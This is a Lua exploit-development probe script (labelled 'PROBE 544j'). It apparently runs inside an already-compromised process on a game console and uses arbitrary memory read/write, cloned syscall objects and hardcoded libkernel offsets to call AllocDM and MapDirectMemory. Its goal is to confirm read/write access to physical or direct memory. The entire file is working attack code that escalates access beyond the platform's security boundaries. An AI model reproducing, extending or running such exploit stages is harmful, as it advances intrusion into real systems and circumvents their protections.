-- CRASH_CLASS: LOW
-- PROBE 544j: MapDirectMemory with ISOLATED output buffer
--
-- Hypothesis: MapDM rv=0 (confirmed in 544g/544h/544i), but the write
-- to virt_out corrupts adjacent heap structures used by the native handler
-- chain, causing the chain's return path to produce binary output.
--
-- Fix: allocate virt_out on a SEPARATE mmap page, far from heap.
-- Use GPU mmap (syscall 477) to get isolated memory.
-- Also: use a large alloc with offset to keep virt_out far from
-- any metadata.

print("=== PROBE 544j: MapDM ISOLATED BUF ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

if not libkernel_base then print("FATAL"); return end
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local map_fn = libkernel_base + uint64(0x15020)
local alloc_fn = libkernel_base + uint64(0x17EF0)

-- [A] Get isolated page via mmap (anonymous, not GPU)
print("[A] Isolated page")
local sc_mmap = make_syscall(477)
local iso_page = sc_mmap(
    uint64(0),           -- addr (let kernel choose)
    uint64(0x4000),      -- 16KB
    uint64(3),           -- PROT_READ|PROT_WRITE
    uint64(0x1002),      -- MAP_ANON|MAP_PRIVATE
    uint64(0xFFFFFFFF),  -- fd=-1
    uint64(0)            -- offset
)
local iso_n = to_num(iso_page)
if iso_n <= 0 then
    print("  mmap fail, using large alloc instead")
    -- Fallback: allocate 64KB and use the middle
    iso_page = memory.alloc(0x10000)
    iso_n = to_num(iso_page) + 0x8000  -- use middle
    iso_page = uint64(iso_n)
end
print("  iso=" .. q(iso_page))

-- Place virt_out in the isolated page, far from any metadata
local virt_out = iso_page + uint64(0x1000)  -- offset 4KB into the page
wq(virt_out, uint64(0))
print("  virt_out=" .. q(virt_out))

-- Verify write/read on isolated page
wd(virt_out, 0xAAAAAAAA)
local test = rd(to_num(virt_out))
if test then
    if test < 0 then test = test + 0x100000000 end
    print(string.format("  test r/w: 0x%X", test))
else
    print("  isolated page not writable!"); return
end
-- Clear it
wq(virt_out, uint64(0))

-- [B] AllocDM
print("[B] AllocDM")
-- Use isolated page for phys_out too
local phys_out = iso_page + uint64(0x2000)
wq(phys_out, uint64(0))

local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  rv=" .. (ok_a and to_num(arv) or "FAIL") .. " phys=" .. q(phys))
if not ok_a or to_num(arv) ~= 0 then print("FATAL"); return end

-- [C] MapDM with isolated virt_out
print("[C] MapDM")
local ok_m, mrv = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(3),
        uint64(0), phys, uint64(0x4000))
end)

-- Read result IMMEDIATELY
local lo = rd(to_num(virt_out))
local hi = rd(to_num(virt_out) + 4)
if lo then
    if lo < 0 then lo = lo + 0x100000000 end
end
if hi then
    if hi < 0 then hi = hi + 0x100000000 end
end

print("  pcall=" .. tostring(ok_m))
if ok_m then print("  rv=" .. to_num(mrv)) end
if lo and hi then
    print(string.format("  VIRT=%08X%08X", hi, lo))
else
    print("  VIRT=FAULT")
end

-- [D] Test R/W on mapped page
if ok_m and to_num(mrv) == 0 and lo and hi and (lo ~= 0 or hi ~= 0) then
    local virt = uint64(string.format("0x%X%08X", hi, lo))
    print("[D] R/W test on " .. q(virt))

    wd(virt, 0xDEADBEEF)
    local rb = rd(to_num(virt))
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
        print(string.format("  wrote=0xDEADBEEF read=0x%08X", rb))
        if rb == 0xDEADBEEF then
            print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
        end
    else
        print("  read FAULT")
    end

    -- Second pattern
    wd(virt, 0xCAFEBABE)
    rb = rd(to_num(virt))
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
        print(string.format("  wrote=0xCAFEBABE read=0x%08X", rb))
    end

    -- Dump first 32 bytes of the mapped page
    print("[E] Page dump:")
    wd(virt, 0x11111111)
    wd(virt + uint64(4), 0x22222222)
    for off = 0, 28, 4 do
        local dw = rd(to_num(virt) + off)
        if dw then
            if dw < 0 then dw = dw + 0x100000000 end
            io.write(string.format("%08X ", dw))
        else
            io.write("FAULT ")
        end
    end
    print("")
end

print("C=" .. tostring(pcall(function() return syscall.getpid() end)))
print("=== DONE ===")
